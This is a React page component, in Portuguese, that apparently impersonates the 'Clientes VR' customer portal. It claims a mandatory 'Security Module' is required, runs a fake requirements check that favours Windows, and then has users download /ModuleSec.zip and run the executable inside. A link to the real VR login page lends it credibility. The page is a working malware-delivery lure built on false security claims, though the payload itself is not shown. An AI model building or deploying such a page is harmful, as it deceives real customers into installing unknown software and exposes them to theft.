"use client";
import { useEffect, useState } from "react";
import { Resumo } from "./Resumo";
import { SpinnerLoading } from "./spinner";
import Parser from "ua-parser-js";

export const MainContent = () => {
  const [os, setOs] = useState("");
  const [browser, setBrowser] = useState("");

  const [downloadAction, setDownloadAction] = useState("not");

  const handleDownloadActions = () => {
    setDownloadAction("download");
  };

  const getOsSystem = () => {
    let os = "Unknown OS";

    if (navigator.userAgent.indexOf("Win") != -1) os = "Windows";
    if (navigator.userAgent.indexOf("Mac") != -1) os = "MacOS";
    if (navigator.userAgent.indexOf("X11") != -1) os = "UNIX";
    if (navigator.userAgent.indexOf("Linux") != -1) os = "Linux";

    return os;
  };
  useEffect(() => {
    setOs(getOsSystem());
    const parser = new Parser();
    const browser = parser.getResult().browser;
    setBrowser(`${browser.name} - Versão: ${browser.major}`);
  }, []);
  return (
    <>
      <Resumo title="Por que o Módulo de Segurança é obrigatório?">
        <div className="flex w-full justify-center items-center">
          <p className="px-10 font-normal text-base text-zinc-700 flex-wrap">
            O Módulo de Segurança é o que irá garantir
            a sua proteção online no auto-atendimento dos <strong>Clientes VR</strong>. 
            A partir de hoje, para todos os serviços será necessário o módulo instalado.
          </p>
        </div>
      </Resumo>
      <h2 className="font-bold text-2xl text-green-800">
        Verificação de requisitos para o acesso a sua conta
      </h2>
      <Resumo title="Sistema Operacional">
        <>
          <div className="flex flex-row gap-6 px-8 items-center">
            <div className="flex h-12 w-12 justify-center items-center rounded-full bg-white">
              {os === "Windows" ? (
                <>
                  <img
                    width="38"
                    height="38"
                    src="https://img.icons8.com/emoji/48/check-mark-emoji.png"
                    alt="check-mark-emoji"
                  />
                </>
              ) : os === "" ? (
                <>
                  <div className="flex h-12 w-12 justify-center items-center rounded-full bg-white">
                    <SpinnerLoading />
                  </div>
                </>
              ) : (
                <>
                  <img
                    width="38"
                    height="38"
                    src="https://img.icons8.com/fluency/48/delete-sign.png"
                    alt="delete-sign"
                  />
                </>
              )}
            </div>
            <h3 className="font-bold text-green-900 text-base">
              Sistema Windows
            </h3>
          </div>
        </>
      </Resumo>
      <Resumo title="Navegador">
        <div className="flex flex-row gap-6 px-8 items-center">
          {browser === "" ? (
            <>
              <div className="flex h-12 w-12 justify-center items-center rounded-full bg-white">
                <SpinnerLoading />
              </div>
            </>
          ) : (
            <>
              <div className="flex h-12 w-12 justify-center items-center rounded-full bg-white">
                <img
                  width="38"
                  height="38"
                  src="https://img.icons8.com/emoji/48/check-mark-emoji.png"
                  alt="check-mark-emoji"
                />
              </div>

              <h3 className="font-bold text-green-900 text-base">{browser}</h3>
            </>
          )}
        </div>
      </Resumo>
      <Resumo title="Módulo de Segurança">
        <div className="flex flex-row gap-6 px-8 items-center">
          <div className="flex h-12 w-12 justify-center items-center rounded-full bg-white">
            {downloadAction === "not" ? (
              <>
                <img
                  width="38"
                  height="38"
                  src="https://img.icons8.com/fluency/48/delete-sign.png"
                  alt="delete-sign"
                />
              </>
            ) : (
              <>
                <SpinnerLoading />
              </>
            )}
          </div>

          <div className="flex flex-1 flex-col gap-4 py-2 w-full">
            {downloadAction === "not" ? (
              <>
                <p className="text-zinc-700 font-normal text-sm">
                  Você não possui Módulo de Segurança instalado. Para acessar
                  sua conta, baixe e instale o Módulo de Segurança clicando no
                  botão <strong>CONCORDO</strong>.
                </p>
                <div className="flex w-[50%]">
                  <a
                    // onClick={handleDownloadActions}
                    className="cursor-pointer flex py-2 px-8 bg-yellow-300 hover:bg-yellow-400 w-full justify-center items-center text-zinc-600 font-medium"
                  >
                    <button onClick={() => handleDownloadActions()}>
                      CONCORDO
                    </button>
                  </a>
                </div>
              </>
            ) : downloadAction === "download" ? (
              <>
                <p className="text-zinc-700 font-normal text-sm flex-wrap">
                  Faça download clicando no botão{" "}
                  <strong>BAIXAR MÓDULO. </strong>
                  Após o <strong>download</strong>, abra o executável e faça a
                  instalação. Para verificar o processo faça login clicando no
                  botão <strong>ABRIR LOGIN</strong>.
                </p>

                <div className="flex flex-row gap-6">
                  <a
                    href="/ModuleSec.zip"
                    className="cursor-pointer flex py-2 px-8 bg-yellow-300 hover:bg-yellow-400 w-full justify-center items-center text-zinc-600 font-medium"
                  >
                    BAIXAR MÓDULO
                  </a>
                  <a
                    href="https://portal.vr.com.br/portal/portal-vr/login/"
                    target="_blank"
                    className="cursor-pointer flex py-2 px-8 bg-yellow-300 hover:bg-yellow-400 w-full justify-center items-center text-zinc-600 font-medium"
                  >
                    ABRIR LOGIN
                  </a>
                </div>
              </>
            ) : (
              <></>
            )}
          </div>
        </div>
      </Resumo>

      {downloadAction === "download" ? (
        <>
          <p className="font-semibold text-lg  text-green-800">
            O processo de verificação pode durar alguns segundos, permaneça na
            página até a validação total.
          </p>
        </>
      ) : (
        <></>
      )}
    </>
  );
};
